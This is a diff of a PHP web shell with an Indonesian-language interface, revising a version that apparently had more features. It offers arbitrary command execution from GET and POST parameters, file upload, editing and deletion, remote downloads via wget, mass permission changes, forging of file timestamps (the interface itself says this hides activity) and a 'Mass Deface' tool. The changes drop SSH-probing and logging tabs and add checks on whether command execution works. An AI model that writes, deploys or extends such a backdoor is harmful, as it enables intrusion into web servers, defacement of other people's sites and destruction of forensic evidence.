-        $output[] = "";
-        foreach ($logs as $log) {
-            $output[] = "[" . $log['domain'] . "] " . $log['line'];
+        $cmd = trim($_GET['cmd']);
+        if (strlen($cmd) > 10000) {
+            echo "Command too long!";
+            exit;
         }
-        echo nl2br(implode("\n", $output));
-        exit;
-    }
-    
-    if ($action == 'log_monitor') {
-        $minutes = isset($_GET['minutes']) ? intval($_GET['minutes']) : 10;
-        $changes = monitorFileChanges($minutes);
-        $output = [];
-        $output[] = "🔍 FILE CHANGES (Last " . $minutes . " minutes)";
-        $output[] = "=============================================";
-        $output[] = "Total changes: " . count($changes);
-        $output[] = "";
-        if (empty($changes)) {
-            $output[] = "✅ No file changes detected";
-        } else {
-            foreach ($changes as $change) {
-                $output[] = "📄 " . $change['domain'] . "/" . $change['name'];
-                $output[] = "   📂 " . $change['path'];
-                $output[] = "   🕐 " . $change['modified'];
-                $output[] = "   📊 " . formatSize($change['size']);
-                $output[] = "";
-            }
-        }
-        echo nl2br(implode("\n", $output));
+        echo kjEx($cmd, true);
         exit;
     }
     
@@ -1696,7 +1155,8 @@ if (isset($_GET['ajax'])) {
         exit;
     }
     
-    if ($action == 'file_info' && isset($_GET['file'])) {$file = $current_path . '/' . basename($_GET['file']);
+    if ($action == 'file_info' && isset($_GET['file'])) {
+        $file = $current_path . '/' . basename($_GET['file']);
         if (file_exists($file)) {
             $info = [
                 'name' => basename($file),
@@ -1706,8 +1166,7 @@ if (isset($_GET['ajax'])) {
                 'mtime_formatted' => date('Y-m-d H:i:s', filemtime($file)),
                 'atime' => fileatime($file),
                 'atime_formatted' => date('Y-m-d H:i:s', fileatime($file)),
-                'ctime' => filectime($file),
-                'ctime_formatted' => date('Y-m-d H:i:s', filectime($file))
+                'writable' => is_writable($file)
             ];
             header('Content-Type: application/json');
             echo json_encode($info);
@@ -1721,87 +1180,105 @@ if (isset($_GET['ajax'])) {
 // ===================== HANDLE POST ACTIONS ======================
 
 $message = '';
-$mass_results = [];
 $cmd_output = '';
-$extract_result = '';
-$zip_result = '';
-$ssh_output = '';
 $chmod_results = [];
 $timestep_results = [];
+$extract_result = '';
+$zip_result = '';
+$mass_results = [];
 
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     if (!isset($_POST['csrf_token']) || !verifyCSRFToken($_POST['csrf_token'])) {
         $message = "⚠️ CSRF Token tidak valid!";
     } else {
         
+        // File Upload
         if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] == 0) {
-            $target = $current_path . '/' . basename($_FILES['upload_file']['name']);
-            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
-                $message = "✅ Upload berhasil!";
-                logActivityMulti("Uploaded file: " . $target, $current_path);
+            $filename = basename($_FILES['upload_file']['name']);
+            $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+            if (!in_array($ext, $config['allowed_extensions'])) {
+                $message = "❌ Ekstensi file tidak diizinkan!";
             } else {
-                $message = "❌ Upload gagal!";
+                $target = $current_path . '/' . $filename;
+                if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
+                    $message = "✅ Upload berhasil!";
+                    logActivity("Uploaded file: " . $target);
+                } else {
+                    $message = "❌ Upload gagal! (Permission denied)";
+                }
             }
         }
         
+        // Create Folder
         if (isset($_POST['create_folder'])) {
-            $full_path = realpath($current_path) . '/' . trim($_POST['folder_name']);
-            if (mkdir($full_path, 0755)) {
-                $message = "✅ Folder berhasil dibuat!";
-                logActivityMulti("Created folder: " . $full_path, $current_path);
-            } else {
-                $message = "❌ Gagal membuat folder!";
+            $folder_name = trim($_POST['folder_name']);
+            if (!empty($folder_name)) {
+                $full_path = realpath($current_path) . '/' . $folder_name;
+                if (@mkdir($full_path, 0755)) {
+                    $message = "✅ Folder berhasil dibuat!";
+                    logActivity("Created folder: " . $full_path);
+                } else {
+                    $message = "❌ Gagal membuat folder! (Permission denied)";
+                }
             }
         }
         
+        // DELETE
         if (isset($_POST['delete_item'])) {
-            $full_path = $current_path . '/' . $_POST['delete_item'];
-            if (deleteItem($full_path)) {
-                $message = "✅ Berhasil dihapus!";
-                logActivityMulti("Deleted: " . $full_path, $current_path);
+            $item_name = $_POST['delete_item'];
+            $full_path = $current_path . '/' . $item_name;
+            
+            if ($full_path == __FILE__) {
+                $message = "❌ Tidak bisa menghapus file ini!";
             } else {
-                $message = "❌ Gagal menghapus!";
+                if (deleteItem($full_path)) {
+                    $message = "✅ Berhasil dihapus: " . htmlspecialchars($item_name);
+                } else {
+                    $message = "❌ Gagal menghapus: " . htmlspecialchars($item_name) . " (Permission denied)";
+                }
             }
+            
+            header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($current_path) . '&msg=' . urlencode($message));
+            exit;
         }
         
+        // Rename
         if (isset($_POST['rename_item'])) {
             $old_path = $current_path . '/' . $_POST['old_name'];
             $new_path = dirname($old_path) . '/' . $_POST['new_name'];
-            if (rename($old_path, $new_path)) {
+            if (@rename($old_path, $new_path)) {
                 $message = "✅ Berhasil diubah!";
-                logActivityMulti("Renamed: " . $old_path . " → " . $new_path, $current_path);
+                logActivity("Renamed: " . $old_path . " → " . $new_path);
             } else {
-                $message = "❌ Gagal mengubah!";
+                $message = "❌ Gagal mengubah! (Permission denied)";
             }
         }
         
+        // Edit File
         if (isset($_POST['edit_file']) && isset($_POST['file_content'])) {
             $file_path = $current_path . '/' . $_POST['file_path'];
             if (file_put_contents($file_path, $_POST['file_content']) !== false) {
                 $message = "✅ File berhasil diupdate!";
-                logActivityMulti("Edited file: " . $file_path, $current_path);
+                logActivity("Edited file: " . $file_path);
             } else {
-                $message = "❌ Gagal mengupdate file!";
+                $message = "❌ Gagal mengupdate file! (Permission denied)";
             }
         }
         
         // ===== TIMESTEP =====
         if (isset($_POST['timestep_single'])) {
             $path = $current_path . '/' . $_POST['timestep_path'];
-            $timestamp = strtotime($_POST['timestep_date'] . ' ' . ($_POST['timestep_time'] ?? '00:00:00'));
+            $timestamp = strtotime($_POST['timestep_date']);
             if (!$timestamp) $timestamp = time();
             $type = $_POST['timestep_type'] ?? 'both';
             
             $result = changeTimestamp($path, $timestamp, $type);
             $message = $result['message'];
-            if ($result['status']) {
-                logActivityMulti("TIMESTEP: " . $path . " → " . date('Y-m-d H:i:s', $timestamp), $current_path);
-            }
         }
         
         if (isset($_POST['timestep_mass'])) {
             $dir = !empty($_POST['timestep_mass_dir']) ? $_POST['timestep_mass_dir'] : $current_path;
-            $timestamp = strtotime($_POST['timestep_mass_date'] . ' ' . ($_POST['timestep_mass_time'] ?? '00:00:00'));
+            $timestamp = strtotime($_POST['timestep_mass_date']);
             if (!$timestamp) $timestamp = time();
             $pattern = $_POST['timestep_pattern'] ?? '*';
             $type = $_POST['timestep_mass_type'] ?? 'both';
@@ -1809,9 +1286,6 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
             $result = massChangeTimestamp($dir, $timestamp, $pattern, $type);
             $message = $result['message'];
             $timestep_results = $result['errors'] ?? [];
-            if ($result['status']) {
-                logActivityMulti("Mass TIMESTEP: " . $dir . " (" . $result['success'] . " files)", $dir);
-            }
         }
         
         // ===== WGET =====
@@ -1838,7 +1312,6 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
                 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                 curl_setopt($ch, CURLOPT_TIMEOUT, 60);
-                curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                 $content = curl_exec($ch);
                 curl_close($ch);
             }
@@ -1847,9 +1320,9 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
                 if (file_put_contents($target, $content)) {
                     $file_size = formatSize(filesize($target));
                     $message = "✅ Download berhasil!\n📁 File: " . $filename . "\n📊 Size: " . $file_size;
-                    logActivityMulti("wget: " . $url . " → " . $filename, $current_path);
+                    logActivity("wget: " . $url . " → " . $filename);
                 } else {
-                    $message = "❌ Gagal menyimpan file!";
+                    $message = "❌ Gagal menyimpan file! (Permission denied)";
                 }
             } else {
                 $cmd = "wget -O '" . addslashes($target) . "' '" . addslashes($url) . "' 2>&1";
@@ -1857,7 +1330,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
                 if (file_exists($target) && filesize($target) > 0) {
                     $file_size = formatSize(filesize($target));
                     $message = "✅ Download berhasil (via command)!\n📁 File: " . $filename . "\n📊 Size: " . $file_size;
-                    logActivityMulti("wget (cmd): " . $url . " → " . $filename, $current_path);
+                    logActivity("wget (cmd): " . $url . " → " . $filename);
                 } else {
                     $message = "❌ Gagal download:\n" . $output;
                 }
@@ -1879,7 +1352,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
                 $result = extract_file($full_file, $target);
                 if ($result['status']) {
                     $message = "✅ " . $result['message'];
-                    logActivityMulti("unzip: " . $file, $current_path);
+                    logActivity("unzip: " . $file);
                 } else {
                     $message = "❌ " . $result['message'];
                 }
@@ -1905,7 +1378,6 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
             $result = chmodMass($target_dir, $file_perm, $dir_perm, true);
             $message = $result['message'];
             $chmod_results = $result['errors'] ?? [];
-            logActivityMulti("Mass CHMOD: " . $target_dir, $target_dir);
         }
         
         // CHMOD by Pattern
@@ -1916,33 +1388,17 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
             $result = chmodByPattern($target_dir, $pattern, $permission);
             $message = $result['message'];
             $chmod_results = $result['errors'] ?? [];
-            logActivityMulti("CHMOD by Pattern: " . $target_dir . " (" . $pattern . ")", $target_dir);
-        }
-        
-        // SSH Config Reader
-        if (isset($_POST['ssh_config_read'])) {
-            $config_path = !empty($_POST['config_path']) ? $_POST['config_path'] : null;
-            $ssh_output = readSSHConfig($config_path);
-            logActivityMulti("SSH Config Read");
-        }
-        
-        // SSH Detector
-        if (isset($_POST['ssh_detect'])) {
-            $ssh_output = sshDetector();
-            logActivityMulti("SSH Detector");
-        }
-        
-        // SSH Quick Port
-        if (isset($_POST['ssh_quick_port'])) {
-            $ssh_output = quickSSHPort();
-            logActivityMulti("SSH Quick Port");
         }
         
         // Command
         if (isset($_POST['alfa_cmd'])) {
             $cmd = $_POST['alfa_cmd'];
-            $cmd_output = kjEx($cmd, true);
-            logActivityMulti("Command: " . $cmd, $current_path);
+            if (strlen($cmd) > 10000) {
+                $cmd_output = "Command too long!";
+            } else {
+                $cmd_output = kjEx($cmd, true);
+                logActivity("Command: " . $cmd);
+            }
         }
         
         // Extract
@@ -1951,7 +1407,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
             $target = !empty($_POST['extract_target']) ? $_POST['extract_target'] : dirname($file);
             $result = extract_file($file, $target);
             $extract_result = $result['message'];
-            logActivityMulti("Extract: " . $file . " → " . $target, $target);
+            logActivity("Extract: " . $file . " → " . $target);
         }
         
         // Zip
@@ -1960,7 +1416,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
             $dest = $_POST['zip_dest'];
             $result = zip_file($source, $dest);
             $zip_result = $result['message'];
-            logActivityMulti("Zip: " . $source . " → " . $dest, dirname($dest));
+            logActivity("Zip: " . $source . " → " . $dest);
         }
         
         // Mass Deface
@@ -1973,7 +1429,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
             if ($result['status']) {
                 $mass_results = [$result['message']];
                 $message = "✅ Mass Deface selesai! Total: " . $result['files'] . " file.";
-                logActivityMulti("Mass Deface: " . $result['files'] . " files in " . $target_dir, $target_dir);
+                logActivity("Mass Deface: " . $result['files'] . " files in " . $target_dir);
             } else {
                 $message = "❌ " . $result['message'];
             }
@@ -1998,6 +1454,7 @@ $breadcrumbs = array_reverse($breadcrumbs);
 
 $csrf_token = generateCSRFToken();
 $timestamp_options = getTimestampOptions();
+$env_info = getEnvironmentInfo();
 ?>
 <!DOCTYPE html>
 <html lang="id">
@@ -2008,7 +1465,6 @@ $timestamp_options = getTimestampOptions();
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* ===== STYLES ===== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Poppins', sans-serif;
@@ -2020,14 +1476,12 @@ $timestamp_options = getTimestampOptions();
         ::-webkit-scrollbar { width: 6px; height: 6px; }
         ::-webkit-scrollbar-track { background: rgba(255,255,255,0.02); border-radius: 10px; }
         ::-webkit-scrollbar-thumb { background: rgba(66, 165, 245, 0.3); border-radius: 10px; }
-        ::-webkit-scrollbar-thumb:hover { background: rgba(66, 165, 245, 0.5); }
         
         .container {
             max-width: 1440px;
             margin: 0 auto;
             background: rgba(20, 28, 58, 0.7);
             backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
             border-radius: 24px;
             border: 1px solid rgba(255, 255, 255, 0.04);
             box-shadow: 0 30px 80px rgba(0, 0, 0, 0.5);
@@ -2044,18 +1498,59 @@ $timestamp_options = getTimestampOptions();
             border-bottom: 1px solid rgba(255, 255, 255, 0.04);
         }
         .header-left { display: flex; align-items: center; gap: 15px; }
-        .header-logo { font-size: 28px; background: linear-gradient(135deg, #42a5f5, #7c4dff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .header-title { font-size: 20px; font-weight: 700; color: #ffffff; letter-spacing: 1px; }
-        .header-title span { background: linear-gradient(135deg, #42a5f5, #7c4dff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .header-badge { display: inline-block; padding: 2px 12px; background: rgba(66, 165, 245, 0.15); border: 1px solid rgba(66, 165, 245, 0.15); border-radius: 20px; font-size: 9px; color: rgba(255, 255, 255, 0.3); letter-spacing: 1px; margin-left: 8px; }
-        .header-right { display: flex; align-items: center; gap: 15px; font-size: 13px; color: rgba(255, 255, 255, 0.4); }
+        .header-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #ffffff;
+            letter-spacing: 1px;
+        }
+        .header-title span {
+            background: linear-gradient(135deg, #42a5f5, #7c4dff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .header-badge {
+            display: inline-block;
+            padding: 2px 12px;
+            background: <?php echo $env_info['command_works'] ? 'rgba(76, 175, 80, 0.15)' : 'rgba(255, 152, 0, 0.15)'; ?>;
+            border: 1px solid <?php echo $env_info['command_works'] ? 'rgba(76, 175, 80, 0.15)' : 'rgba(255, 152, 0, 0.15)'; ?>;
+            border-radius: 20px;
+            font-size: 9px;
+            color: <?php echo $env_info['command_works'] ? '#66bb6a' : '#ffa726'; ?>;
+            letter-spacing: 1px;
+            margin-left: 8px;
+        }
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.4);
+        }
         .header-right .user-info { display: flex; align-items: center; gap: 8px; }
-        .header-right .user-info .avatar { width: 30px; height: 30px; border-radius: 50%; background: linear-gradient(135deg, #42a5f5, #7c4dff); display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 600; color: #fff; }
-        .header-right a { color: rgba(255, 255, 255, 0.3); text-decoration: none; transition: 0.3s; font-size: 13px; }
+        .header-right .user-info .avatar {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #42a5f5, #7c4dff);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: 600;
+            color: #fff;
+        }
+        .header-right a {
+            color: rgba(255, 255, 255, 0.3);
+            text-decoration: none;
+            transition: 0.3s;
+            font-size: 13px;
+        }
         .header-right a:hover { color: rgba(255, 255, 255, 0.6); }
         
         .tabs {
-            display: flex;background: rgba(0, 0, 0, 0.2);
+            display: flex;
+            background: rgba(0, 0, 0, 0.2);
             border-bottom: 1px solid rgba(255, 255, 255, 0.03);
             flex-wrap: wrap;
             padding: 0 10px;
@@ -2079,7 +1574,15 @@ $timestamp_options = getTimestampOptions();
         .tab-content { display: none; padding: 25px 30px; }
         .tab-content.active { display: block; animation: fadeIn 0.3s ease; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        .tab-content h3 { font-size: 18px; font-weight: 600; color: #ffffff; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; }
+        .tab-content h3 {
+            font-size: 18px;
+            font-weight: 600;
+            color: #ffffff;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
         .tab-content h3 span { font-size: 12px; font-weight: 400; color: rgba(255, 255, 255, 0.2); }
         
         .toolbar {
@@ -2103,12 +1606,12 @@ $timestamp_options = getTimestampOptions();
             font-size: 13px;
             font-family: 'Poppins', sans-serif;
             transition: 0.3s;
-        }.toolbar input[type="text"]:focus, .toolbar select:focus {
+        }
+        .toolbar input[type="text"]:focus, .toolbar select:focus {
             border-color: rgba(66, 165, 245, 0.3);
             outline: none;
             background: rgba(255, 255, 255, 0.06);
         }
-        .toolbar input[type="text"]::placeholder { color: rgba(255, 255, 255, 0.15); }
         
         .btn {
             padding: 8px 18px;
@@ -2217,7 +1720,7 @@ $timestamp_options = getTimestampOptions();
         .file-item .actions .delete { background: rgba(244, 67, 54, 0.15); color: #ef5350; }
         .file-item .actions .delete:hover { background: rgba(244, 67, 54, 0.25); }
         .file-item .actions .chmod { background: rgba(76, 175, 80, 0.15); color: #66bb6a; }
-        .file-item .actions .chmod:hover {background: rgba(76, 175, 80, 0.25); }
+        .file-item .actions .chmod:hover { background: rgba(76, 175, 80, 0.25); }
         .file-item .actions .timestep { background: rgba(233, 30, 99, 0.15); color: #f06292; }
         .file-item .actions .timestep:hover { background: rgba(233, 30, 99, 0.25); }
         
@@ -2236,7 +1739,13 @@ $timestamp_options = getTimestampOptions();
         }
         
         .form-group { margin: 10px 0; }
-        .form-group label { display: inline-block; width: 140px; font-weight: 500; font-size: 13px; color: rgba(255, 255, 255, 0.6); }
+        .form-group label {
+            display: inline-block;
+            width: 140px;
+            font-weight: 500;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.6);
+        }
         .form-group input, .form-group textarea, .form-group select {
             padding: 8px 14px;
             background: rgba(255, 255, 255, 0.04);
@@ -2274,7 +1783,8 @@ $timestamp_options = getTimestampOptions();
         .quick-commands button {
             padding: 4px 14px;
             background: rgba(255, 255, 255, 0.03);
-            color: rgba(255, 255, 255, 0.4);border: 1px solid rgba(255, 255, 255,0.04);
+            color: rgba(255, 255, 255, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.04);
             border-radius: 6px;
             cursor: pointer;
             font-size: 11px;
@@ -2353,7 +1863,12 @@ $timestamp_options = getTimestampOptions();
         }
         
         .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        .info-grid .item { padding: 10px 15px; background: rgba(255, 255, 255, 0.02); border-radius: 8px; border: 1px solid rgba(255, 255, 255, 0.03); }
+        .info-grid .item {
+            padding: 10px 15px;
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+        }
         .info-grid .item strong { color: rgba(255, 255, 255, 0.6); }
         .info-grid .item .value { color: #e0e4f0; }
         
@@ -2377,7 +1892,9 @@ $timestamp_options = getTimestampOptions();
         <div class="header-left">
             <div class="header-title">
                 <?php echo $branding['short_name']; ?>
-                <span class="header-badge"><?php echo $branding['version']; ?></span>
+                <span class="header-badge">
+                    <?php echo $env_info['command_works'] ? '⚡ CMD OK' : '📦 PHP Native'; ?>
+                </span>
             </div>
         </div>
         <div class="header-right">
@@ -2398,8 +1915,6 @@ $timestamp_options = getTimestampOptions();
         <div class="tab" onclick="showTab('download')"><i class="fas fa-download"></i> Download</div>
         <div class="tab" onclick="showTab('chmod')"><i class="fas fa-lock"></i> CHMOD</div>
         <div class="tab" onclick="showTab('timestep')"><i class="fas fa-clock"></i> Timestep</div>
-        <div class="tab" onclick="showTab('log')"><i class="fas fa-history"></i> Log</div>
-        <div class="tab" onclick="showTab('ssh')"><i class="fas fa-shield-alt"></i> SSH</div>
         <div class="tab" onclick="showTab('extract')"><i class="fas fa-file-archive"></i> Extract</div>
         <div class="tab" onclick="showTab('zip')"><i class="fas fa-compress"></i> Zip</div>
         <div class="tab" onclick="showTab('deface')"><i class="fas fa-skull"></i> Deface</div>
@@ -2410,7 +1925,7 @@ $timestamp_options = getTimestampOptions();
     <div id="tab-files" class="tab-content active">
         <div class="toolbar">
             <form method="post" enctype="multipart/form-data">
-                <input type="hidden" name="csrf_token"value="<?php echo $csrf_token; ?>">
+                <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">
                 <input type="file" name="upload_file" required>
                 <button type="submit" class="btn btn-success"><i class="fas fa-upload"></i> Upload</button>
             </form>
@@ -2451,7 +1966,7 @@ $timestamp_options = getTimestampOptions();
         <?php endif; ?>
         
         <div class="file-grid">
-            <?php if ($items): ?>
+            <?php if ($items && count($items) > 0): ?>
                 <?php foreach ($items as $item): ?>
                     <div class="file-item <?php echo $item['is_root'] ? 'is-root' : ''; ?>">
                         <?php if ($item['is_root']): ?>
@@ -2522,7 +2037,13 @@ $timestamp_options = getTimestampOptions();
     
     <!-- Tab: Command -->
     <div id="tab-cmd" class="tab-content">
-        <h3><i class="fas fa-terminal"></i> Command Execution <span>Live Output • Auto Clear</span></h3>
+        <h3><i class="fas fa-terminal"></i> Command Execution</h3>
+        <?php if (!$env_info['command_works']): ?>
+            <div class="message warning">
+                ⚠️ Command execution tidak tersedia. Gunakan PHP Native functions.
+                <br>Disabled: <?php echo htmlspecialchars($env_info['disabled_functions']); ?>
+            </div>
+        <?php endif; ?>
         <form method="post" onsubmit="return runCommandAndClear(this);">
             <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">
             <div class="form-group">
@@ -2553,12 +2074,12 @@ $timestamp_options = getTimestampOptions();
     
     <!-- Tab: Download -->
     <div id="tab-download" class="tab-content">
-        <h3><i class="fas fa-download"></i> Download Manager <span>wget + unzip • Auto Clear</span></h3>
+        <h3><i class="fas fa-download"></i> Download Manager</h3>
         
         <div id="download_result" style="display:none;" class="cmd-output"></div>
         
         <div style="background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.04);border-radius:12px;padding:20px;margin:15px 0;">
-            <h4 style="color:#66bb6a;font-weight:400;"><i class="fas fa-cloud-download-alt"></i> Download File (wget)</h4>
+            <h4 style="color:#66bb6a;font-weight:400;"><i class="fas fa-cloud-download-alt"></i> Download File</h4>
             <form method="post" onsubmit="return runWgetAndClear(this);">
                 <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">
                 <div class="form-group">
@@ -2576,7 +2097,7 @@ $timestamp_options = getTimestampOptions();
         </div>
         
         <div style="background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.04);border-radius:12px;padding:20px;margin:15px 0;">
-            <h4 style="color:#ffa726;font-weight:400;"><i class="fas fa-file-archive"></i> Extract Archive (unzip)</h4>
+            <h4 style="color:#ffa726;font-weight:400;"><i class="fas fa-file-archive"></i> Extract Archive</h4>
             <form method="post" onsubmit="return runUnzipAndClear(this);">
                 <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">
                 <div class="form-group">
@@ -2590,23 +2111,11 @@ $timestamp_options = getTimestampOptions();
                 <button type="submit" name="unzip_file" value="1" class="btn btn-warning"><i class="fas fa-file-archive"></i> Extract</button>
             </form>
         </div>
-        
-        <div style="padding:15px;background:rgba(255,255,255,0.02);border-radius:10px;border:1px solid rgba(255,255,255,0.03);">
-            <h4 style="color:rgba(255,255,255,0.3);font-size:12px;font-weight:400;"><i class="fas fa-info-circle"></i> Supported Formats</h4>
-            <div style="display:flex;flex-wrap:wrap;gap:10px;margin-top:8px;font-size:12px;color:rgba(255,255,255,0.3);">
-                <span>📦 ZIP</span>
-                <span>📦 TAR</span>
-                <span>📦 GZ</span>
-                <span>📦 TAR.GZ</span>
-                <span>📦 RAR</span>
-                <span>📦 TGZ</span>
-            </div>
-        </div>
     </div>
     
     <!-- Tab: CHMOD -->
     <div id="tab-chmod" class="tab-content">
-        <h3><i class="fas fa-lock"></i> CHMOD Manager <span>File & Folder Permission</span></h3>
+        <h3><i class="fas fa-lock"></i> CHMOD Manager</h3>
         
         <div class="chmod-section">
             <h4>🔒 1. Single CHMOD</h4>
@@ -2691,25 +2200,16 @@ $timestamp_options = getTimestampOptions();
         
         <?php if (!empty($chmod_results)): ?>
             <div class="cmd-output" style="max-height:200px;">
-                <?php foreach ($chmod_results as $result): ?><div><?php echo htmlspecialchars($result); ?></div>
+                <?php foreach ($chmod_results as $result): ?>
+                    <div><?php echo htmlspecialchars($result); ?></div>
                 <?php endforeach; ?>
             </div>
         <?php endif; ?>
-        
-        <div style="margin-top:15px;padding:15px;background:rgba(255,255,255,0.02);border-radius:10px;border:1px solid rgba(255,255,255,0.03);">
-            <h4 style="color:rgba(255,255,255,0.4);font-size:12px;font-weight:400;"><i class="fas fa-info-circle"></i> Permission Guide</h4>
-            <div style="display:grid;grid-template-columns:1fr 1fr;gap:5px;font-size:12px;color:rgba(255,255,255,0.3);margin-top:8px;">
-                <div>644: rw-r--r-- (File default)</div>
-                <div>755: rwxr-xr-x (Folder default)</div>
-                <div>777: rwxrwxrwx ⚠️ TIDAK AMAN</div>
-                <div>600: rw------- (Private)</div>
-            </div>
-        </div>
     </div>
     
     <!-- Tab: Timestep -->
     <div id="tab-timestep" class="tab-content">
-        <h3><i class="fas fa-clock"></i> Timestep Manager <span>Ubah Timestamp File & Folder</span></h3>
+        <h3><i class="fas fa-clock"></i> Timestep Manager</h3>
         
         <?php if (!empty($timestep_results)): ?>
             <div class="cmd-output" style="max-height:200px;">
@@ -2745,7 +2245,7 @@ $timestamp_options = getTimestampOptions();
                     <select onchange="document.getElementById('timestep_date').value = this.value;">
                         <option value="">-- Quick Select --</option>
                         <?php foreach ($timestamp_options as $key => $opt): ?>
-                            <option value="<?php echodate('Y-m-d\TH:i', $opt['value']); ?>">
+                            <option value="<?php echo date('Y-m-d\TH:i', $opt['value']); ?>">
                                 <?php echo htmlspecialchars($opt['label']); ?>
                             </option>
                         <?php endforeach; ?>
@@ -2787,101 +2287,6 @@ $timestamp_options = getTimestampOptions();
                     <i class="fas fa-clock"></i> Mass Timestep
                 </button>
             </form>
-        </div>
-        
-        <div style="margin-top:15px;padding:15px;background:rgba(255,255,255,0.02);border-radius:10px;border:1px solid rgba(255,255,255,0.03);">
-            <h4 style="color:rgba(255,255,255,0.4);font-size:12px;font-weight:400;"><i class="fas fa-info-circle"></i> Timestamp Info</h4>
-            <div style="display:grid;grid-template-columns:1fr 1fr;gap:5px;font-size:12px;color:rgba(255,255,255,0.3);margin-top:8px;">
-                <div>🕐 Modified Time (mtime): Kapan file terakhir diubah</div>
-                <div>🕐 Access Time (atime): Kapan file terakhir diakses</div>
-                <div>⚠️ Ubah timestamp bisa digunakan untuk menyembunyikan aktivitas</div>
-                <div>💡 Gunakan dengan bijak!</div>
-            </div>
-        </div>
-    </div>
-    
-    <!-- Tab: Log -->
-    <div id="tab-log" class="tab-content">
-        <h3><i class="fas fa-history"></i> Activity Log <span>Multi-Domain</span></h3>
-        
-        <div style="background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.04);border-radius:12px;padding:15px;margin:10px 0;">
-            <h4 style="color:rgba(255,255,255,0.5);font-weight:400;font-size:14px;">🌐 Domains</h4>
-            <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:8px;margin-top:10px;">
-                <?php 
-                $domains = findAllDomains();
-                foreach ($domains as $domain): 
-                ?>
-                <div style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.03);">
-                    <div style="color:#e0e4f0;font-size:13px;"><?php echo htmlspecialchars($domain['domain']); ?></div>
-                    <div style="font-size:11px;color:rgba(255,255,255,0.2);">📂 <?php echo htmlspecialchars($domain['path']); ?></div>
-                    <div style="margin-top:5px;">
-                        <button onclick="viewLog('<?php echo addslashes($domain['path']); ?>')" class="btn btn-cyan" style="padding:2px 10px;font-size:10px;">
-                            <i class="fas fa-eye"></i> View
-                        </button>
-                        <button onclick="monitorDomain('<?php echo addslashes($domain['path']); ?>')" class="btn btn-warning" style="padding:2px 10px;font-size:10px;">
-                            <i class="fas fa-search"></i> Monitor
-                        </button>
-                    </div>
-                </div>
-                <?php endforeach; ?>
-            </div>
-        </div>
-        
-        <div style="background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.04);border-radius:12px;padding:15px;margin:10px 0;">
-            <h4 style="color:rgba(255,255,255,0.5);font-weight:400;font-size:14px;">📋 Log Viewer</h4>
-            <div class="form-group">
-                <label>Domain Path:</label>
-                <input type="text" id="log_domain_path" placeholder="/home/user/public_html" style="min-width:350px;">
-            </div>
-            <div class="form-group">
-                <label>Lines:</label>
-                <select id="log_lines">
-                    <option value="20">20</option>
-                    <option value="50" selected>50</option>
-                    <option value="100">100</option>
-                    <option value="200">200</option>
-                    <option value="500">500</option>
-                </select>
-            </div>
-            <div class="form-group">
-                <label>Filter:</label>
-                <input type="text" id="log_filter" placeholder="Filter keyword" style="min-width:200px;">
-            </div>
-            <button onclick="viewLog()" class="btn btn-primary"><i class="fas fa-eye"></i> View Log</button>
-            <button onclick="viewAggregatedLog()" class="btn btn-purple"><i class="fas fa-layer-group"></i> All Domains</button>
-            <button onclick="monitorChanges()" class="btn btn-warning"><i class="fas fa-search"></i> Monitor Changes</button>
-        </div>
-        
-        <div id="log_result" style="display:none;" class="cmd-output"></div>
